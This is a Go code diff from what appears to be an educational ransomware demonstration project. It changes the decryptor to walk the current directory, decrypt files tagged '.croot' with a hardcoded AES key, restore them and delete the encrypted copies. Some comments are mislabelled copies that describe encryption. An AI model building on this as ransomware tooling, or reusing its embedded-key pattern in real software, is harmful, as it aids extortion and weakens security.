@@ -1,46 +1,65 @@
 package main
 
 import (
-	"bytes"
-	"compress/gzip"
-	"io"
 	"os"
+	"path/filepath"
+	"strings"
 
 	"github.com/indomy/ransomdemo/pkg"
 )
 
 func main() {
-	// Baca file terenkripsi
-	encryptedFile := "output.enc"
-	encryptedData, err := os.ReadFile(encryptedFile)
+
+	// Direktori yang ingin dikompresi dan dienkripsi
+	dir := "."
+
+	// Tambahkan semua file dan folder dari direktori ke arsip tar
+	err := filepath.Walk(dir, func(file string, fi os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+
+		// Abaikan direktori itu sendiri
+		if fi.IsDir() {
+			return nil
+		}
+		//kalo bukan file yang diencrypt maka di abaikan
+		if !strings.Contains(file, ".croot") {
+			return nil
+		}
+		// Baca file
+		data, err := os.ReadFile(file)
+		if err != nil {
+			return err
+		}
+
+		// Dekripsi data menggunakan AES
+		key := []byte("indonesiacodeacademykeyto32bytes") // 32 bytes key for AES-256
+		decryptedData, err := pkg.Decrypt(data, key)
+		if err != nil {
+			return err
+		}
+
+		// Simpan data terenkripsi ke file
+		outputFile := strings.Replace(file, ".croot", "", 1)
+		err = os.WriteFile(outputFile, decryptedData, 0644)
+		if err != nil {
+			return err
+		}
+		println(file)
+		//hapus file aslinya
+		err = os.Remove(file)
+		if err != nil {
+			println(err.Error())
+		}
+
+		return nil
+	})
+
 	if err != nil {
-		panic(err)
+		println(err.Error())
+		//panic(err)
 	}
 
-	// Dekripsi data menggunakan AES
-	key := []byte("passphrasewhichneedstobe32bytes!") // 32 bytes key for AES-256
-	decryptedData, err := pkg.Decrypt(encryptedData, key)
-	if err != nil {
-		panic(err)
-	}
-
-	// Dekompresi data menggunakan gzip
-	gzipReader, err := gzip.NewReader(bytes.NewReader(decryptedData))
-	if err != nil {
-		panic(err)
-	}
-	decompressedData, err := io.ReadAll(gzipReader)
-	if err != nil {
-		panic(err)
-	}
-	gzipReader.Close()
-
-	// Simpan data yang sudah didekompresi ke file
-	outputFile := "output.tar"
-	err = os.WriteFile(outputFile, decompressedData, 0644)
-	if err != nil {
-		panic(err)
-	}
-
-	println("File berhasil didekripsi dan didekompresi!")
+	println("File berhasil didekripsi")
 }
